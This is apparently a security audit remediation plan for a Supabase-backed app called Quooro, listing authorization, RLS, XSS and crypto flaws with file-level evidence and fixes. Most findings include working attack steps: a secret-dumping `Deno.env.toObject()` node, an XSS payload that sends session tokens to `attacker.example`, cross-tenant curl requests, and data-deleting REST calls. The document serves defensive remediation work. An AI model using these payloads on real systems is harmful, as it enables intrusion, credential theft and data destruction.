# Quooro — Remediation Plan

Prepared for the owner ahead of the Lovable → Claude Code handover. Every item below traces to a verified finding with a file and line. Findings that shared a root cause across audit dimensions have been merged and are marked **[merged: …]**.

## Executive summary

Quooro is not safe to run in production today. There are six independent, currently-live paths to a total compromise of customer data, and two of them require no account, no JWT, and no anon key at all: `quooro-chat` performs full CRM CRUD under the service-role key using a `user_id` taken straight from the request body, and `ecommerce_orders` has an `anon` `SELECT` policy of `USING (true)` that dumps every merchant's orders and customer PII to anyone holding the public key committed in `.env`. The single most urgent item is not a code fix — it is key rotation: `supabase/functions/execute-workflow/index.ts:83` runs arbitrary user-authored JavaScript via `new Function` in the edge isolate, so any user who ever signed up could have executed `return Deno.env.toObject()` and walked away with `SUPABASE_SERVICE_ROLE_KEY`, `STRIPE_SECRET_KEY`, `RESEND_API_KEY`, `LOVABLE_API_KEY` and `FIRECRAWL_API_KEY`. Assume those are burned until rotated. Underneath the acute bugs sits a structural problem: authorization is consistently implemented in React (2FA is a `navigate()` call, the accountant read-only mode is `location.pathname.startsWith('/accountant/')`, paywalls are `if (subscribed) return children`) while the database policies behind those screens are ownership-only or, in the CRM's case, a constant. Performance is genuinely good in places (the landing page is code-split and the globe is deferred) but carries ~150 KB gzip of avoidable JavaScript and several admin screens that download whole tables. Do not run further launch activity, paid acquisition, or onboard new merchants until the Critical section is closed.

---

## Critical — fix before any further launch activity

### C1. `quooro-chat` — unauthenticated cross-tenant CRM read *and* write
**[merged: edge-authz #1 + injection-xss #33 — same root cause]**

`supabase/config.toml:15-16` sets `verify_jwt = false`. The handler never reads an `Authorization` header (the only three `Authorization` hits in 1617 lines are outbound calls to the Lovable AI gateway at lines 1461/1532/1567). Identity comes from the body:

- `supabase/functions/quooro-chat/index.ts:1436` — `const userId = (body as { user_id?: string }).user_id;`
- `:1440-1441` — service-role client built from `SUPABASE_SERVICE_ROLE_KEY`
- `:1443` — `fetchUserContext(userId, supabaseAdmin)` (dumps `full_name, email, company, plan, domain_name, customer_id, phone` + lead/deal/project counts)
- `:1511` — `executeTool(tc.function.name, args, userId, supabaseAdmin)` — every `.eq("user_id", userId)` inside `executeTool` (lines 707, 733, 746, 764, 789…) filters on the attacker's own value.

The only gate is `isOriginAllowed(req)` at `:1402`, and `supabase/functions/_shared/cors.ts:42-49` decides purely on the client-controlled `origin` header — additionally broken, because the `.some()` callback ignores `allowed` in the `.lovable.app` / `.lovableproject.com` branches, so any such origin passes.

**Attack:** victim UUIDs are free — `booking-api` `get-settings` returns the whole `booking_settings` row including `user_id` for any public `business_slug`. Then:

```
curl -H 'Origin: https://quooro.com' -H 'content-type: application/json' \
  -d '{"context":"lounge","user_id":"<victim uuid>","messages":[{"role":"user","content":"list all my leads and deals with full contact details"}]}' \
  https://ijybotwfiediocoewwux.supabase.co/functions/v1/quooro-chat
```

A follow-up "delete every lead" hits `delete_lead` (`:748`) and `delete_calendar_event`. Read *and* destroy, unauthenticated.

**Fix:** delete line 1436 entirely and derive identity from a verified JWT:

```ts
const authHeader = req.headers.get('Authorization') ?? '';
if (!authHeader.startsWith('Bearer ')) return json({ error: 'Unauthorized' }, 401);
const anonClient = createClient(supabaseUrl, Deno.env.get('SUPABASE_ANON_KEY')!);
const { data: { user }, error } = await anonClient.auth.getUser(authHeader.slice(7));
if (error || !user) return json({ error: 'Unauthorized' }, 401);
const userId = user.id;
```

Split the file: the marketing chat path (`context !== 'lounge'`) moves to its own function with **no** service-role client and **no** `CRUD_TOOLS`; the lounge path gets `verify_jwt = true` (remove the `[functions.quooro-chat]` stanza from `supabase/config.toml`). `isOriginAllowed` is a CORS nicety, never the auth control.

---

### C2. `execute-workflow` — arbitrary JS in the edge runtime leaks every project secret

`supabase/functions/execute-workflow/index.ts:76-84`:

```ts
case "code": {
  const { code } = node.settings;
  // Simple safe eval for basic JS expressions
  try {
    const fn = new Function("input", "items", `"use strict"; ${code}`);
    const result = fn(inputData, inputData);
    return { output: result ?? inputData };
```

`new Function` compiles in the isolate's global scope — `Deno`, `fetch`, `globalThis` are all reachable regardless of `"use strict"`. Ownership *is* checked (`:408-413`, `.eq('id', workflowId).eq('user_id', user.id)`) but that passes for the attacker's **own** workflow, which is all that's needed. Node output is returned verbatim to the caller at `:549-554`.

**Attack:** save a workflow with one node `{"type":"code","settings":{"code":"return Deno.env.toObject();"}}`, POST `/functions/v1/execute-workflow {"workflowId":"<own id>"}` with your own JWT. The 200 body contains the entire environment. Supabase auto-injects `SUPABASE_SERVICE_ROLE_KEY` and `SUPABASE_DB_URL` into every function, and project secrets are shared across all 43 functions.

**Fix:** remove in-process evaluation. Drop the `code` node type, or run it in `quickjs-emscripten` fed only the input object. Interim defence-in-depth only (**not** a sandbox): `new Function('Deno','globalThis','fetch','input','items','"use strict"; '+code)` invoked as `fn(undefined,undefined,undefined,inputData,inputData)`. **Then rotate all five keys** — see Fix order step 1.

---

### C3. CRM tenant isolation is a constant — every authenticated user owns the whole CRM

`supabase/migrations/20260714134037_370be365-4b7a-49a9-8a5e-1db684fbdeca.sql:23-25`:

```sql
CREATE POLICY "org members manage crm_companies" ON public.crm_companies
  FOR ALL USING (org_id = public.get_primary_admin_id() OR public.has_role(auth.uid(),'admin'))
  WITH CHECK (...);
```

The only definition of the helper, `20260119002210_72f5f116-8a1f-46bd-9ccc-b7c4c91dcb56.sql:4-16`, is `SELECT user_id FROM public.user_roles WHERE role = 'admin' ORDER BY created_at ASC LIMIT 1` — **no `auth.uid()` term**. It returns the same constant UUID for every caller, and every seeded row uses it as `org_id`. No later migration redefines it. The same predicate is on `crm_contacts` (:51), `crm_lifecycle_stages` (:75), `crm_lifecycle_history` (:92,:95), `crm_opportunities` (:118), `crm_communications` (`20260714134446…:41-45`), `crm_financial_links` (`20260714135417…:28-31`), `crm_workflows`/`crm_workflow_runs` (`20260714135559…:24-27,:54-61`). Each table carries an explicit `GRANT SELECT, INSERT, UPDATE, DELETE … TO authenticated`, and the policies have **no `TO` clause**, so `anon` reaches them wherever default table privileges apply.

**Attack:** sign up. `GET /rest/v1/crm_contacts?select=*` returns every contact on the platform. `FOR ALL` with the same `WITH CHECK` means `PATCH`/`DELETE` work too.

**Fix:** stopgap today — `USING (public.has_role(auth.uid(),'admin'))` on all nine tables. Real fix — introduce membership mirroring the correct `acc_is_org_member` pattern at `20260713232033_4555bc85…sql:63`, add `public.crm_is_org_member(uuid, uuid)`, and rewrite each policy as `FOR ALL TO authenticated USING (has_role(auth.uid(),'admin') OR crm_is_org_member(auth.uid(), org_id))` with matching `WITH CHECK`.

---

### C4. `ecommerce_orders` is world-readable with the public anon key

`supabase/migrations/20260714034150_b828831a-25f6-4d0a-9155-d4466aca4878.sql`:

```sql
-- line 25
GRANT SELECT, INSERT ON public.ecommerce_orders TO anon;
-- lines 47-49
CREATE POLICY "Anyone can read a specific order" ON public.ecommerce_orders
  FOR SELECT TO anon USING (true);
```

The comment at line 43 says "Anonymous shoppers may create an order and read it by ID" — nothing binds the row to the caller, and PostgREST filters are supplied by the client, so `?id=eq.<uuid>` is simply omitted. `grep -rn ecommerce_orders supabase/migrations/` matches only this file. Columns include `customer_email, customer_name, customer_phone, shipping_address` (JSONB), `items`, `total`, `payment_intent_id`.

**Attack:** `GET /rest/v1/ecommerce_orders?select=*` with the anon key from `.env`, paginating with `Range: 0-999`, `1000-1999`, … — every order for every merchant.

**Fix:**

```sql
DROP POLICY "Anyone can read a specific order" ON public.ecommerce_orders;
REVOKE SELECT ON public.ecommerce_orders FROM anon;
```

Serve order-status lookups through a service-role edge function verifying a per-order token, or add `lookup_token uuid NOT NULL DEFAULT gen_random_uuid()` and gate on `USING (lookup_token = NULLIF(current_setting('request.headers',true)::json->>'x-order-token','')::uuid)`. Note the anon `INSERT` policy is also `WITH CHECK (true)` — anyone can forge orders against any `user_id` (see M6).

---

### C5. Three `SECURITY DEFINER` RPCs dump the security audit trail to anon

`supabase/migrations/20260125232524_bb3eeea0-8f57-4846-85cc-e231c80911ed.sql`:
- `:142` `CREATE OR REPLACE FUNCTION public.get_security_logs_decrypted(p_limit integer DEFAULT 100)` — `LANGUAGE plpgsql SECURITY DEFINER`, body is a bare `RETURN QUERY SELECT … FROM public.security_logs ORDER BY created_at DESC LIMIT p_limit;` with no `has_role`/`auth.uid()` guard
- `:78` `get_blocked_ips_decrypted()`
- `:113` `get_whitelisted_ips_decrypted()`

Base-table RLS *is* admin-only (`20260119223316_418e0a6f…sql:18-21`), but `SECURITY DEFINER` bypasses it. The hardening migration `20260714024522_59e78b6e…sql:72-89` revokes EXECUTE on 16 functions — **none of these three**. Postgres grants EXECUTE to PUBLIC by default and `anon` is a member of PUBLIC.

**Attack:** `POST /rest/v1/rpc/get_security_logs_decrypted` with `{"p_limit": 1000000}` and the anon key returns the whole audit trail with IPs passed through `decrypt_pii`, i.e. plaintext. `get_whitelisted_ips_decrypted` tells the attacker exactly which source IPs bypass blocking.

**Fix — both halves are required:**

```sql
REVOKE EXECUTE ON FUNCTION public.get_security_logs_decrypted(integer) FROM PUBLIC, anon;
REVOKE EXECUTE ON FUNCTION public.get_blocked_ips_decrypted() FROM PUBLIC, anon;
REVOKE EXECUTE ON FUNCTION public.get_whitelisted_ips_decrypted() FROM PUBLIC, anon;
```

and recreate each with `IF NOT public.has_role(auth.uid(),'admin') THEN RAISE EXCEPTION 'forbidden' USING ERRCODE = '42501'; END IF;` as the first statement. The revoke alone leaves every authenticated user in; the guard alone leaves anon able to probe.

---

### C6. Stored XSS: raw inbound email HTML rendered into the app origin
**[merged: injection-xss #34 + secrets-crypto #41 — same root cause, #41 adds the token-theft payload]**

`src/pages/lounge/LoungeMail.tsx:1100` renders `selectedEmail.body_html` with `dangerouslySetInnerHTML`. DOMPurify is not a dependency (`grep purify|sanitize|xss package.json` → zero hits; the only repo mention is a comment at `src/lib/validation.ts:184`). Ingestion is unsanitized: `supabase/functions/email-sync/index.ts:210` (`body_html: bodyHtml`, raw Gmail MIME) and `:350` (raw Microsoft Graph body). Read path is `select('*')` at `LoungeMail.tsx:569`. Route is live at `src/App.tsx:381`. Of the 10 `dangerouslySetInnerHTML` sites in `src/`, this is the only one fed by an external unauthenticated party.

The blast radius is set by three other facts: `src/integrations/supabase/client.ts:11-16` stores the session in `localStorage` with `autoRefreshToken: true`; `supabase/functions/email-oauth/index.ts:148-149` writes `access_token`/`refresh_token` in cleartext; and `supabase/migrations/20260222033128_ae043df2…sql:88` is `CREATE POLICY "Users manage own email accounts" … FOR ALL USING (public.is_owner(user_id))`, so the browser can select those columns.

**Attack:** send the victim an HTML email containing `<img src=x onerror="fetch('https://attacker.example/x?d='+encodeURIComponent(localStorage.getItem('sb-ijybotwfiediocoewwux-auth-token')))">`. On open, the attacker gets a self-refreshing Supabase session, plus — via `supabase.from('email_accounts').select('*')` — the victim's cleartext Gmail/Outlook refresh token, which survives a Quooro password reset. Same session also reads `password_vault_items` and `user_connections.credentials`.

**Fix — three changes:**
1. `npm i dompurify @types/dompurify`, then in `LoungeMail.tsx`:
```ts
const cleanHtml = useMemo(() => DOMPurify.sanitize(selectedEmail?.body_html ?? '', {
  FORBID_TAGS: ['script','style','iframe','object','embed','form','base','link'],
  FORBID_ATTR: ['srcdoc','formaction'],
  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|cid:|data:image\/(?:png|jpeg|gif|webp);)/i,
}), [selectedEmail?.body_html]);
```
2. Render it inside `<iframe sandbox="" srcDoc={cleanHtml} />` — no `allow-scripts`, no `allow-same-origin` — so a DOMPurify bypass lands in an opaque origin.
3. Sanitize on write at `email-sync/index.ts:210` and `:350`, and backfill existing rows. Independently, encrypt `email_accounts.access_token/refresh_token/imap_password` and replace the `FOR ALL` policy with a column-limited view.

---

## High

### H1. `booking-api` — unauthenticated cancel/reschedule of any booking, plus PII echo
**[merged: edge-authz #2 + injection-xss #35]**

`supabase/functions/booking-api/index.ts:25` — `const apiKey = req.headers.get("x-api-key") || body.api_key;` and the entire verification block is inside `if (apiKey) { … }` (`:28-55`). Omit the key: no 401, control falls through to `switch (action)` at `:60`. Service-role client built unconditionally at `:14-18`; `verify_jwt = false` at config.toml:48-49. `cancelBooking` (`:561`) is `.eq("id", booking_id).select().single()` — no `.eq("user_id", …)`. `rescheduleBooking` (`:580-617`) does `select("*")`, re-inserts a copy, and returns it at `:616` — leaking `customer_name/email/phone/notes/price/metadata` (order metadata holds items and delivery address, `:477-483`). `src/components/booking/BookingAPIPanel.tsx:235` documents `x-api-key` for exactly this call, so the control is advertised and not enforced. Booking IDs are `gen_random_uuid()` (`20260308000823_a9236729…sql:72`) so this is per-object, not mass exfil.

**Fix:** make the key mandatory for mutating actions and never honour a body-supplied identity:

```ts
const PUBLIC_ACTIONS = new Set(["get-services","get-staff","get-availability","get-slots","get-settings","create-booking","submit-enquiry","book-table","place-order","contact-form"]);
if (!PUBLIC_ACTIONS.has(action)) {
  if (!apiKey) return json({ error: "API key required" }, 401);
  // …existing hash + lookup…
  if (!authenticatedUserId) return json({ error: "Unauthorized" }, 401);
  body.user_id = authenticatedUserId;   // unconditional
}
```

Add `.eq("user_id", authenticatedUserId)` to both the update in `cancelBooking` and the select+update in `rescheduleBooking`; return only `{ id, status }`. Also stop returning `user_id` from `get-settings` (`:620-633`) — that field is the input C1 and M6 key on.

### H2. `deploy-site` — no ownership check on `siteId`

`supabase/functions/deploy-site/index.ts:25-32` authenticates the caller (`:24-26`) but never checks that `siteId` belongs to `user.id` — there is no `designer_sites` lookup in the file. All writes use the service-role client (`:19-21`): `site_deployments` insert (`:54-67`), storage upload to `sites/${siteId}/vN` with `upsert:true` (`:51`, `:303`), `site_domains` upsert `onConflict:'domain_name'` with `user_id: user.id` (`:129-141`), and archiving of the victim's live deployment (`:158-164`).

**Attack:** post another tenant's `siteId` with your own `pages` array. Their live site is replaced with your HTML, their previous deployment flipped to `archived`, and by choosing `siteName` so `generateSubdomain(siteName, siteId)` (`:367-376`) collides, you rewrite an existing `site_domains` row's owner.

**Fix:** immediately after auth, before computing `storagePath`: `SELECT id FROM designer_sites WHERE id = siteId AND user_id = user.id` (`maybeSingle`), 404 if absent. Scope the `site_domains` upsert to rows already owned by the caller.

### H3. `site-files` storage bucket — any authenticated user can overwrite any tenant's live site

`supabase/migrations/20260307172810_d6a7d765-384f-4893-a623-f7a6d300372c.sql` (16 lines total) sets `UPDATE storage.buckets SET public = true WHERE id = 'site-files';` then adds an INSERT policy `TO authenticated WITH CHECK (bucket_id = 'site-files')` (`:5-7`) and an UPDATE policy `TO authenticated USING (bucket_id = 'site-files')` (`:13-15`) — **neither has a path predicate**. This overrode the correct owner-scoped design at `20260119202038_f0a8c267…sql:33-46`. The later hardening migration `20260714024522…:68` drops only the read policy.

**Attack:** deployment paths are visible in every live URL (`deploy-site/index.ts:114`). `POST /storage/v1/object/site-files/sites/<victimSiteId>/v<n>/index.html` with `x-upsert: true` and any user's JWT → stored XSS on the platform origin plus defacement.

**Fix:** `deploy-site` uploads with the service-role key and bypasses RLS anyway, so no `authenticated` write policy is needed:

```sql
DROP POLICY "Authenticated users can upload site files" ON storage.objects;
DROP POLICY "Users can update their site files" ON storage.objects;
```

The only remaining browser-side writer is `src/components/admin/AdminWebsiteManagement.tsx:198-201`, covered by the surviving admin policy. **Do not** apply an `auth.uid()::text = (storage.foldername(name))[1]` predicate — the first path segment is the literal `sites`, so that would break every deployment.

### H4. `leads` — any authenticated user reads, reassigns and deletes all unassigned leads

`supabase/migrations/20260215184715_fdf05359-8f33-4a0d-8d41-263b00730199.sql:2-17` — the SELECT, UPDATE **and** DELETE policies all read `USING (assigned_to = auth.uid() OR assigned_to IS NULL OR has_role(auth.uid(),'admin'::app_role))`. `assigned_to` is nullable with no default (`20260120201919_60c812fd…sql:37`), and unassigned rows are genuinely produced (`booking-api/index.ts:655`, `quooro-chat/index.ts:708`, `src/components/admin/LeadImportDialog.tsx:452`). The only later change (`20260215184730_974e629b…`) tightens INSERT only.

**Attack:** `GET /rest/v1/leads?assigned_to=is.null&select=*` returns the entire prospect pool; `phone`/`email` come back as `ENC:` and are replayed through the ungated `decrypt_pii` RPC (H6). `DELETE /rest/v1/leads?assigned_to=is.null` wipes the pipeline.

**Fix:** drop the `assigned_to IS NULL` disjunct from SELECT and UPDATE; restrict DELETE to admins. If a shared pool is genuinely wanted, gate it on an explicit `has_role(auth.uid(),'staff')`, not on every account.

### H5. `is_team_owner()` is self-granted and unscoped

`20260121010036_b14841d8-df2b-4ad4-8a4e-6d4f88048ec8.sql:2-5` — `CREATE POLICY "Users can create their own team" ON public.client_teams FOR INSERT WITH CHECK (auth.uid() = primary_account_id);`. Permissive policies OR together, so this beats the admin-only INSERT at `20260120225305_3366132b…sql:49-51`. `is_team_owner` (`20260302215113_7bdb5816…sql:2-13`) is `SELECT EXISTS (SELECT 1 FROM public.client_teams WHERE primary_account_id = _user_id)` — **no `team_id` parameter**, so it is a global boolean, wired unscoped into six RBAC policies in that file and into `planner_tasks` UPDATE (`20260302220043_9ef0b378…:46-53`) and DELETE (`:56-61`).

**Attack:** `POST /rest/v1/client_teams {"team_name":"x","primary_account_id":"<self>"}`. Now `DELETE /rest/v1/planner_tasks?status=eq.todo` destroys every tenant's tasks, and `DELETE /rest/v1/rbac_roles?is_system=eq.true` removes the seeded system roles.

**Fix:** re-declare as `is_team_owner(_user_id uuid, _team_id uuid)` returning `EXISTS (… WHERE id = _team_id AND primary_account_id = _user_id)`. Remove the unscoped disjunct from all six RBAC policies (they should be `has_role(…,'admin') OR created_by = auth.uid()`), and change `planner_tasks` UPDATE/DELETE to `user_id = auth.uid() OR assigned_to = auth.uid() OR has_role(auth.uid(),'admin') OR (team_id IS NOT NULL AND public.is_team_owner(auth.uid(), team_id))`.

### H6. `decrypt_pii` — a SECURITY DEFINER decryption oracle callable by anon, with a committed key
**[merged: rls-db #16 + secrets-crypto #37]**

`20260127223145_2656edf4-6f02-4d9b-8678-ff4171055abc.sql:23` defines `decrypt_pii(p_encrypted_value text)` as `SECURITY DEFINER` deriving its key as `encode(extensions.digest(current_database() || 'quooro_pii_key_2024','sha256'),'hex')` — no caller check. It is absent from the REVOKE block at `20260714024522…:72-89`. Reachability is proven by the browser client calling it directly: `src/lib/piiDecrypt.ts:13` `supabase.rpc("decrypt_pii", { p_encrypted_value: value })`.

Two independent breaks. (1) The key is the constant `sha256('postgres' || 'quooro_pii_key_2024')` — `current_database()` is `postgres` on every Supabase project and the literal is in the repo, so any dump/backup/replica decrypts offline and the at-rest encryption provides zero value against the exact threat it was built for. (2) Anyone with the anon key POSTs ciphertext and gets plaintext back on demand. Chained with H4 this converts the unassigned-lead dump into every prospect's real phone and email.

**Fix:** new migration — `REVOKE EXECUTE ON FUNCTION public.encrypt_pii(text), public.decrypt_pii(text) FROM PUBLIC, anon, authenticated;`. The trigger functions and the `check_ip_blocked`/`check_ip_whitelisted` wrappers call these as definer and keep working. Rework `src/lib/piiDecrypt.ts` to call a service-role edge function that verifies row ownership. Then move the key into Supabase Vault or `Deno.env` and re-encrypt every `ENC:` row.

### H7. Two-factor authentication is advisory — the session is fully valid before any code is entered
**[merged: frontend-authz #26 + #28 + secrets-crypto #42]**

`src/contexts/AuthContext.tsx:79-80` calls `signInWithPassword`, minting a full session. `src/components/auth/UnifiedSignIn.tsx:340-343` is only `if (profile?.two_factor_enabled) { navigate('/verify-2fa', …); return; }` — a client-side route change. `src/components/ProtectedRoute.tsx` checks only `if (!user)`. Grepping `two_factor_verified_at` across `src/` and all 149 migrations finds the column definition, four writes/reads inside `two-factor-auth/index.ts`, and generated types — **no RLS policy, no SECURITY DEFINER function, no route guard, no other edge function** ever gates on it. The Google path (`src/components/auth/GoogleSignInButton.tsx:30-38`) has no 2FA step at all.

Worse, the state is client-writable. `20260113211353_8593f11b-67fb-4e77-810a-226ea651f0cb.sql:65-67` is `CREATE POLICY "Users can update own profile" ON public.profiles FOR UPDATE USING (auth.uid() = user_id);` — no `WITH CHECK`, no column restriction, never dropped in any migration, and the 2FA columns live directly on `profiles` (`20260119215019…:3-5`). An attacker holding only the password can `PATCH /rest/v1/profiles?user_id=eq.<id>` with `{"two_factor_enabled":false,"two_factor_secret":null,"backup_codes":[],"known_ips":["<their ip>"]}` and permanently strip both 2FA and the new-device gate without presenting a code. Backup codes are stored in **cleartext** (`two-factor-auth/index.ts:711`) and are readable by every admin via `"Admins can view all profiles"` (`20260118222020:49`).

**Fix:** make the factor authoritative in Postgres.
- Preferred: migrate to Supabase native MFA (`supabase.auth.mfa.enroll/challenge/verify`) so AAL lives in the JWT, then require `(auth.jwt()->>'aal') = 'aal2'` in sensitive RLS and at the top of each edge handler.
- If keeping the custom TOTP table: move `two_factor_enabled, two_factor_secret, backup_codes, two_factor_verified_at, known_ips` off `profiles` into a table whose RLS is `USING (false)` for anon and authenticated — the pattern already applied to `two_factor_attempts` at `20260125232404:42-49` — so only the service-role function can mutate them. Hash backup codes per-code with Argon2id.
- Interim, if the column move is too invasive: add `BEFORE UPDATE` trigger `profiles_guard_privileged_cols()` restoring `two_factor_*`, `backup_codes`, `known_ips`, `email_verified`, `account_type` from `OLD` when `auth.uid() IS NOT NULL AND NOT has_role(auth.uid(),'admin')`. Note `src/pages/CustomerLogin.tsx:258-263` currently self-writes `verification_token`/`verification_expires_at`/`email_verified` — move that to `send-verification-email` first or whitelist those two columns.

### H8. Accountant read-only mode is `location.pathname`; RLS is role-blind

`src/pages/lounge/OfficeAccounting.tsx:88` — `const isAccountant = location.pathname.startsWith('/accountant/');` — drives only cosmetics: tab filtering (`:163-165`), `!isAccountant` render conditions (`:302/304/315`), and `readOnly={isAccountant}` on `JournalView` alone (`:305`). AR/AP/banking/VAT/payroll/assets/fx (`:306-312`) get no `readOnly` prop at all.

Behind it, `public.acc_is_org_member(_user_id,_org_id)` (`20260713232033_4555bc85…sql:63-67`) has **no `role` predicate** and is the sole non-admin term in every accounting write policy across `20260713232033`, `20260713232809`, `20260713233329`, `20260713234024`, `20260713234626`, `20260713235343`. A role-aware helper `acc_is_accountant_of` exists (`20260714001231:68-76`) and is used by nothing.

**Attack:** an invited external accountant opens `/lounge/office/accounting` instead of `/accountant/org/:orgId` — `CustomerGuard.tsx:52` whitelists `/lounge/office` — and gets the full owner UI. The UI isn't even needed: `await supabase.from('acc_journal_entries').delete().eq('org_id','<client-org>').is('posted_at',null)` works from the console. (Posted entries are protected by the `acc_je_append_only` trigger at `20260713232033:284-286`; nothing stops posting new fraudulent ones.)

**Fix:** add
```sql
CREATE FUNCTION public.acc_org_role(_user_id uuid,_org_id uuid) RETURNS text
LANGUAGE sql STABLE SECURITY DEFINER SET search_path=public AS $$
  SELECT CASE WHEN EXISTS(SELECT 1 FROM acc_organizations o WHERE o.id=_org_id AND o.owner_user_id=_user_id)
         THEN 'owner' ELSE (SELECT m.role FROM acc_org_members m WHERE m.org_id=_org_id AND m.user_id=_user_id LIMIT 1) END $$;
```
Keep `acc_is_org_member` for SELECT policies; change every write/`FOR ALL` policy to `USING (has_role(auth.uid(),'admin') OR public.acc_org_role(auth.uid(), org_id) <> 'accountant')`. Then derive `isAccountant` in the component from the fetched `acc_org_members.role`.

### H9. `team_memberships` — self-insert as `owner` into any team

`20260121010036_b14841d8-df2b-4ad4-8a4e-6d4f88048ec8.sql:7-11` — `"Users can add themselves to team as owner"`, `WITH CHECK (auth.uid() = user_id)` only, no `TO` clause, no role predicate. Grepping every `DROP POLICY` for `team_memberships` across 149 migrations: this one is never dropped. Downstream, `client_pricing` (`20260120225305:112-122`), `client_contracts` (`:129-139`) and `client_invoices` (`:146-156`) all gate on `AND tm.member_role IN ('owner','financial')`.

**Attack:** an offboarded team member who learned their `team_id` runs `supabase.from('team_memberships').insert({ team_id:'<uuid>', user_id: me, member_role:'owner' })` and regains access at a *higher* role than they held — to negotiated pricing, signed contracts and the full invoice history.

**Fix:** `DROP POLICY "Users can add themselves to team as owner" ON public.team_memberships;`. The legitimate owner path is already covered by `"Primary owners can insert team members"` (`20260121010214:50`) plus `"Users can create their own team"`. The team-code join branch this was left for is already dead code — `src/pages/CustomerLogin.tsx:247` inserts `member_role:'member'`, which violates the CHECK constraint at `20260120225232:68`. Replace it with a SECURITY DEFINER RPC that validates the code and inserts `member_role='project'`.

### H10. Site-visitor passwords: unsalted single-round SHA-256, no throttling
**[merged: edge-authz #10 + secrets-crypto #40]**

`supabase/functions/site-visitor-auth/index.ts:36-41` (signup) and `:76-80` (login) — one SHA-256 digest over `password + site_id`, hex-encoded. `site_id` is a shared public per-site identifier, not a per-user salt: identical passwords collide visibly and one hashcat `-m 1400` run at ~50 GH/s cracks a site's entire visitor base at once. Login (`:82-90`) matches with `.eq('password_hash', passwordHash)` — no rate limit, lockout, captcha, or delay — and `verify_jwt = false` (config.toml:24-25) with wildcard CORS at `:5`, so unauthenticated credential stuffing runs at full request rate from any origin. `password` is never validated at signup, so an omitted field hashes the literal `'undefined'`. Owners can read the hashes themselves: `20260215061427_fcbc38a7…sql:160-164`, `FOR ALL USING (EXISTS (… designer_sites s WHERE s.id = site_id AND s.user_id = auth.uid()))`.

**Fix:** scrypt/Argon2id with a per-row random salt (`deno.land/x/scrypt`), add a `password_algo` column and re-hash on next successful login. Fetch by `(site_id, email)` and verify in code, not in the SQL predicate. Add per-(site_id,email) and per-IP attempt counters. Reject signup when `typeof password !== 'string' || password.length < 8`. Split the owner `FOR ALL` policy so `password_hash` is not selectable. Replace the wildcard CORS with `getCorsHeaders(req)`.

### H11. Password Vault: no KDF, and the "TOTP" step accepts any six digits
**[merged: secrets-crypto #38 + #39 + #46 — one component cluster]**

- `src/pages/lounge/OfficePasswordVault.tsx:61` — `crypto.subtle.importKey('raw', enc.encode(password.padEnd(32,'0').slice(0,32)), 'AES-GCM', false, ['encrypt'])`. **The user's vault password IS the AES key.** Mirrored at `:76` for decrypt, and identically at `src/components/vault/VaultContent.tsx:27-30, 57-77`. The server-side verifier is salted (`deriveKey` with `salt = user!.id`, `:258`) but is only two SHA-256 rounds — hashcat `-m 1400` at ~10^10 guesses/sec/GPU; a 12-char human password falls in hours, and the cracked password is the decryption key, with no second secret to recover.
- `:314-327` — `handleUnlockTOTP` regex-checks `/^\d{6}$/` and then unconditionally advances. `totp_secret_encrypted` is written at setup and **never read back**; there is no HMAC anywhere in the file. `000000` passes. Same at `VaultContent.tsx:291-305`.
- `:263-266` — security-question answers are `sha256(answer.toLowerCase().trim())`, unsalted, from a fixed ten-question list (`:87-98`), and verified **client-side** at `:331-343` against a hash the browser already downloaded.
- `failed_attempts` is written (`:300-303`) and reset (`:342`) but never read; `is_locked` has zero hits in either component or any migration; and the owner can reset the counter themselves via the `FOR UPDATE` policy at `20260223013511:26`.
- `20260223014615_a6c87ec0-6aa9-4cc4-84bb-66acd415e2e0.sql:2-5` — `"Admins can view all vault configs" … USING (public.has_role(auth.uid(),'admin'))` hands every admin every user's `password_hash`, `master_key_hash`, `master_key_encrypted` and `totp_secret_encrypted`.

The UI claims "AES-GCM encrypted" (`:520`) and "Unlocked · AES-GCM" (`:918`) while the effective factor count is one.

**Fix:** derive the AES-GCM key with PBKDF2-SHA256 ≥600k iterations (or Argon2id) over the vault password plus a per-vault random salt persisted alongside the config; store the server-side verifier as a *separate* Argon2id hash with a different salt. Move unlock verification into a service-role edge function that decrypts `totp_secret_encrypted` with a server-held key, performs real RFC 6238 verification with a replay cache, enforces `failed_attempts`/`is_locked` with backoff, and only then releases a wrapped item key. Stop shipping `answerHash` to the client. Drop the `20260223014615` admin policies. Apply every change to `VaultContent.tsx` too.

---

## Medium

**M1. `send-verification-email` — link host from the request `Origin`.** `supabase/functions/send-verification-email/index.ts:20-25` (`getBestSiteUrl` returns `req.headers.get('origin')` whenever it starts with `http`) and `:294` builds `${siteUrl}/verify-email?token=${token}`. `verify_jwt = false`, service-role client at `:210-214`, wildcard CORS at `:7`. Result: a genuine, SPF/DKIM-aligned "Verify your email for Quooro" message from the real Resend sender whose button points at the attacker's host. The resend rate limit is gated on the caller-chosen `is_resend` flag (`:260-271`, `:288-292`), so omitting it skips `check_verification_resend_limit` entirely — unbounded Resend spend and inbox flooding. `:252` returns "Email is already verified" (400) only for real verified accounts vs a generic 200 at `:244-249` — an account-existence oracle. *Not* takeover: `verify_email_token` (`20260125192511:37-75`) only sets `email_verified = true`. **Fix:** `const siteUrl = Deno.env.get('SITE_URL') ?? 'https://quooro.com'` (validate against `_shared/cors.ts` allowlist if preview hosts are needed); apply the resend limit on every call; return the same generic 200 for the verified case; replace wildcard CORS with `getCorsHeaders(req)`.

**M2. `confirm-user-email` — no auth at all, confirms any user id.** The whole file is 66 lines: service-role client at `:18-23`, `{ userId }` from the body at `:25`, `updateUserById(userId, { email_confirm: true })` at `:35-38`, and it returns `updatedUser.user?.email` at `:54`. It's absent from config.toml so platform `verify_jwt = true` applies — but the public anon key is a validly-signed token, so that is not an authorization control. Nothing in the repo calls it. **Fix:** delete the function. If it must stay, mirror `create-admin-account/index.ts` — resolve the caller with an anon client, 401 if absent, check `user_roles` for `admin`, 403 otherwise — and stop returning the email.

